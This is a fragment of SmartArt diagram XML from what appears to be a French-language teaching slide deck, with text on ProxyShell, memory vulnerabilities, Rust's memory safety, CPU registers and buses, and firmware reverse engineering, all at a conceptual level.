      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="345757" y="876300"/>
          <a:ext cx="628649" cy="628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AF618F-6B3A-4BE3-9C2A-3C4404C3C1AA}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="1320164" y="619125"/>
          <a:ext cx="7917497" cy="1142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67" tIns="120967" rIns="120967" bIns="1209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Microsoft a corrigé les failles, mais de nombreux systèmes restent non patchés.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="1320164" y="619125"/>
        <a:ext cx="7917497" cy="1142999"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{3367C00D-09D2-4C74-A4BF-DCA90361F13B}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2047875"/>
          <a:ext cx="9237662" cy="114299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8B28F7-F1C0-480C-9ECE-84224478C5E6}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="345757" y="2305050"/>
          <a:ext cx="628649" cy="628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A643B-F999-40CE-B12B-9A822429E0A4}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="1320164" y="2047875"/>
          <a:ext cx="7917497" cy="1142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67" tIns="120967" rIns="120967" bIns="1209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ProxyShell reste exploité activement dans des attaques ciblées.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="1320164" y="2047875"/>
        <a:ext cx="7917497" cy="114299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B8BC95-03B0-A14A-A984-92B073B101B5}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1771949"/>
          <a:ext cx="5334000" cy="962324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270764" rIns="41397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Évolution constante des menaces.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Complexité croissante des systèmes.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Multiplication des points d'entrée : IoT, cloud, edge computing.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="1771949"/>
        <a:ext cx="5334000" cy="962324"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{737D267C-E37E-FF42-B96A-054A8CC9530C}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="1580069"/>
          <a:ext cx="3733799" cy="383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Le paysage actuel :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="285434" y="1598803"/>
        <a:ext cx="3696331" cy="346292"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{EE2B4AC0-480D-3046-93BA-637EAAFE64A6}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2996354"/>
          <a:ext cx="5334000" cy="757574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270764" rIns="41397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Réagir rapidement aux nouvelles menaces.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/>
            <a:t>Concevoir des contre-mesures robustes.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="2996354"/>
        <a:ext cx="5334000" cy="757574"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{5A3EAAE5-E512-CD43-AEC9-54B854ABEF0E}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="2804474"/>
          <a:ext cx="3733799" cy="3837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1" kern="1200"/>
            <a:t>Importance pour un professionnel en sécurité :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="285434" y="2823208"/>
        <a:ext cx="3696331" cy="34629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60339C-53D5-4ECD-97B5-A0A37A37170B}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="619125"/>
          <a:ext cx="9237662" cy="11429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6EFA6F-14B7-41E2-A96A-9631D5859580}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="345757" y="876300"/>
          <a:ext cx="628649" cy="628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67B08-6BE5-4F9E-A09D-24A51F8068A9}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="1320164" y="619125"/>
          <a:ext cx="4156947" cy="1142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67" tIns="120967" rIns="120967" bIns="1209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Lien avec la sécurité :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="1320164" y="619125"/>
        <a:ext cx="4156947" cy="1142999"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{45D492A5-D45F-4288-8D42-60D114A93DCB}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="5477112" y="619125"/>
          <a:ext cx="3760549" cy="1142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67" tIns="120967" rIns="120967" bIns="1209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Comprendre les concepts de mémoire (heap, stack).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Identifier facilement des vulnérabilités courantes comme le buffer overflow.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1400" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="5477112" y="619125"/>
        <a:ext cx="3760549" cy="1142999"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{D670D5F2-20FE-4F3C-93AA-273887601D70}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2047875"/>
          <a:ext cx="9237662" cy="11429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9676C-578A-460F-A077-06E24820DBB4}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="345757" y="2305050"/>
          <a:ext cx="628649" cy="628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590D2-B1C2-41FC-8FBE-1929A92C7F42}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="1320164" y="2047875"/>
          <a:ext cx="4156947" cy="1142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67" tIns="120967" rIns="120967" bIns="1209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Exemple concret :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="1320164" y="2047875"/>
        <a:ext cx="4156947" cy="1142999"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{8A184601-8CF9-45D7-A59E-4C72F563E337}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="5477112" y="2047875"/>
          <a:ext cx="3760549" cy="1142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67" tIns="120967" rIns="120967" bIns="1209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Une fonction mal conçue en C peut provoquer une exécution de code arbitraire.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1400" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="5477112" y="2047875"/>
        <a:ext cx="3760549" cy="114299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C4771-2E73-2A4D-9744-730949FF9BAA}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="52482"/>
          <a:ext cx="4543197" cy="7405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Avantages clés de Rust :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1900" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="36150" y="88632"/>
        <a:ext cx="4470897" cy="668236"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{B958BA47-5F14-2042-98B7-CDFD7EC100B1}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="847739"/>
          <a:ext cx="4543197" cy="740536"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-502537"/>
            <a:satOff val="-311"/>
            <a:lumOff val="2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Sécurité mémoire garantie par conception :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1900" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="36150" y="883889"/>
        <a:ext cx="4470897" cy="668236"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{395CB6AC-7413-4E4A-894E-6536CE14E868}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1588276"/>
          <a:ext cx="4543197" cy="1140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24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Gestion de la mémoire sans </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="1500" i="1" kern="1200"/>
            <a:t>garbage collector</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="1500" kern="1200"/>
            <a:t>, mais avec des règles strictes vérifiées à la compilation (ownership, borrow checker).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Empêche les débordements de tampon et les erreurs de libération de mémoire.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="1588276"/>
        <a:ext cx="4543197" cy="1140570"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{B1C33F36-2E04-CE4D-9630-17F354A43E67}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2728846"/>
          <a:ext cx="4543197" cy="740536"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-1005073"/>
            <a:satOff val="-621"/>
            <a:lumOff val="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Abstraction sécurisée :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1900" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="36150" y="2764996"/>
        <a:ext cx="4470897" cy="668236"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{B364559D-69EB-D342-AAD9-5F583217C067}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3469383"/>
          <a:ext cx="4543197" cy="462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24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Permet d’écrire du code système performant sans sacrifier la sécurité.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="3469383"/>
        <a:ext cx="4543197" cy="462127"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{805B37D1-1AFD-E643-BAD7-099A64F32602}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3931510"/>
          <a:ext cx="4543197" cy="740536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Compatibilité avec les plateformes modernes :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1900" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="36150" y="3967660"/>
        <a:ext cx="4470897" cy="668236"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{AC6F7C15-3700-9849-B4BC-C366B2C20584}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="4672047"/>
          <a:ext cx="4543197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24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Idéal pour le développement de systèmes critiques, des IoT aux navigateurs (comme dans le cas de Firefox avec Servo).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="4672047"/>
        <a:ext cx="4543197" cy="66860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91A69D-C463-6D48-82CC-5DFB3546D016}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="34285"/>
          <a:ext cx="5334000" cy="16956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/>
            <a:t>Définition :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="3100" kern="1200"/>
            <a:t> Petites mémoires internes ultra-rapides.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="3100" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="82773" y="117058"/>
        <a:ext cx="5168454" cy="1530076"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{7E6CE80F-AEC8-5649-9EE6-C616649559EA}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1819188"/>
          <a:ext cx="5334000" cy="1695622"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-753805"/>
            <a:satOff val="-466"/>
            <a:lumOff val="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/>
            <a:t>Utilité :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="3100" kern="1200"/>
            <a:t> Stocker temporairement les données en cours de traitement.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="3100" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="82773" y="1901961"/>
        <a:ext cx="5168454" cy="1530076"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{E964B906-9E6B-054E-B44C-18795EAD45D5}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3604090"/>
          <a:ext cx="5334000" cy="1695622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/>
            <a:t>Exemple :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="3100" kern="1200"/>
            <a:t> Accumulateur, compteur de programme.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="3100" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="82773" y="3686863"/>
        <a:ext cx="5168454" cy="153007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DF1AA-A29C-0D43-937E-C6CFC25F4433}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="191414"/>
          <a:ext cx="5334000" cy="15947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1" kern="1200"/>
            <a:t>Définition :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="2900" kern="1200"/>
            <a:t> Réseaux de communication internes au processeur.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2900" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="77847" y="269261"/>
        <a:ext cx="5178306" cy="1439016"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{DAE47874-F6D2-A94E-B70B-92660B570FB9}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1869644"/>
          <a:ext cx="5334000" cy="1594710"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-753805"/>
            <a:satOff val="-466"/>
            <a:lumOff val="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1" kern="1200"/>
            <a:t>Rôle :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="2900" kern="1200"/>
            <a:t> Transporter les données, instructions et adresses entre les composants.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2900" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="77847" y="1947491"/>
        <a:ext cx="5178306" cy="1439016"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{5A5E5B4F-6E04-9948-93B9-A4A33BD505FD}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3547874"/>
          <a:ext cx="5334000" cy="159471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1" kern="1200"/>
            <a:t>Types :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="2900" kern="1200"/>
            <a:t> Bus de données, bus d'adresses, bus de contrôle.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2900" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="77847" y="3625721"/>
        <a:ext cx="5178306" cy="143901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C88655-9832-BE40-B801-D94396CA2874}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="73649"/>
          <a:ext cx="5334000" cy="164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/>
            <a:t>Définition :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="3000" kern="1200"/>
            <a:t> Ensemble d'ordres que la CPU peut exécuter.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="3000" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="80532" y="154181"/>
        <a:ext cx="5172936" cy="1488636"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{42FD6002-3EB8-7943-87BA-56A684EC588C}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1809749"/>
          <a:ext cx="5334000" cy="164970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b="1" kern="1200"/>
            <a:t>Types courants :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="3000" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="80532" y="1890281"/>
        <a:ext cx="5172936" cy="1488636"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{2B354C2D-9F31-324E-93F6-BF91C404A744}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3459449"/>
          <a:ext cx="5334000" cy="1800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55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b="1" kern="1200"/>
            <a:t>Arithmétiques :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="2300" kern="1200"/>
            <a:t> Addition, soustraction.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b="1" kern="1200"/>
            <a:t>Logiques :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="2300" kern="1200"/>
            <a:t> AND, OR, NOT.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b="1" kern="1200"/>
            <a:t>Contrôle :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="2300" kern="1200"/>
            <a:t> Sauts, conditions (ex. IF, GOTO).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="3459449"/>
        <a:ext cx="5334000" cy="180090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15136-2A49-344C-BAC3-C73FBB60EF08}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="642094"/>
          <a:ext cx="4543197" cy="23908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603" tIns="479044" rIns="352603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/>
            <a:t>AX, BX, CX, DX : registres généraux pour les opérations.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/>
            <a:t>SP : pointeur de pile.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/>
            <a:t>IP : pointeur d’instruction.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="642094"/>
        <a:ext cx="4543197" cy="2390849"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{B77D6196-6F30-8B45-8FFC-9D72B31D378E}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="227159" y="302614"/>
          <a:ext cx="3180237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205" tIns="0" rIns="12020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Registres principaux :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="260303" y="335758"/>
        <a:ext cx="3113949" cy="612672"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{8F95619E-0ED0-2C47-A00F-FF50BE0D9C53}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3496625"/>
          <a:ext cx="4543197" cy="159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603" tIns="479044" rIns="352603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/>
            <a:t>Chaque registre joue un rôle spécifique dans la gestion des instructions.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="3496625"/>
        <a:ext cx="4543197" cy="1593900"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{BA30FD8D-5540-A84D-B803-D96BE72C198A}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="227159" y="3157145"/>
          <a:ext cx="3180237" cy="67896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205" tIns="0" rIns="12020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Utilisation pratique :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="260303" y="3190289"/>
        <a:ext cx="3113949" cy="61267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5F7979-6AA6-3644-8E03-2379BA9ADEAA}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="217559"/>
          <a:ext cx="5334000" cy="1539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Définition : Processus d'analyse d'un firmware pour comprendre son fonctionnement interne.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="75163" y="292722"/>
        <a:ext cx="5183674" cy="1389393"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{3DA1143D-6554-FB46-9D75-F938AF2E9CF1}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1837919"/>
          <a:ext cx="5334000" cy="1539719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Importance dans les systèmes IoT :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="75163" y="1913082"/>
        <a:ext cx="5183674" cy="1389393"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{298D9FC1-AE96-494D-AA9A-16ADE6607B4C}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3377639"/>
          <a:ext cx="5334000" cy="1738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355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Identifier les vulnérabilités de sécurité.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Comprendre les fonctionnalités cachées ou non documentées.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200" kern="1200"/>
            <a:t>Permettre la personnalisation ou le dépannage.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2200" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="3377639"/>
        <a:ext cx="5334000" cy="173880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20066-D0F0-BD4C-9C19-60124269A760}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="511274"/>
          <a:ext cx="5334000" cy="2286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458216" rIns="41397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Directement depuis l’appareil.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Téléchargement depuis le site du fabricant.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Sniffing des mises à jour OTA (Over-The-Air).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2200" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="511274"/>
        <a:ext cx="5334000" cy="2286900"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{85C8A65F-8E0F-BE42-A330-A82B2FD20670}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="186554"/>
          <a:ext cx="3733799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Extraction du firmware</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="2200" kern="1200"/>
            <a:t> :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2200" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="298403" y="218257"/>
        <a:ext cx="3670393" cy="586034"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{BCD0411C-5FDC-A04E-93F8-56047C280275}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3241694"/>
          <a:ext cx="5334000" cy="19057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458216" rIns="41397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Identifier les systèmes de fichiers et structures internes.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200" kern="1200"/>
            <a:t>Désassembler ou décompiler les binaires.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2200" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="3241694"/>
        <a:ext cx="5334000" cy="1905749"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{3D63D699-F235-2F49-97E6-8100ADC71220}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="2916974"/>
          <a:ext cx="3733799" cy="64944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Décomposition et analyse</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="2200" kern="1200"/>
            <a:t> :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2200" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="298403" y="2948677"/>
        <a:ext cx="3670393" cy="58603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71576-55BD-574A-A5F6-5DF7590CB35E}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="46403"/>
          <a:ext cx="5334000" cy="126061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C’est quoi ? </a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="61538" y="107941"/>
        <a:ext cx="5210924" cy="1137541"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{FC177785-8A47-CB4F-8464-392523598555}">
      <dsp:nvSpPr>
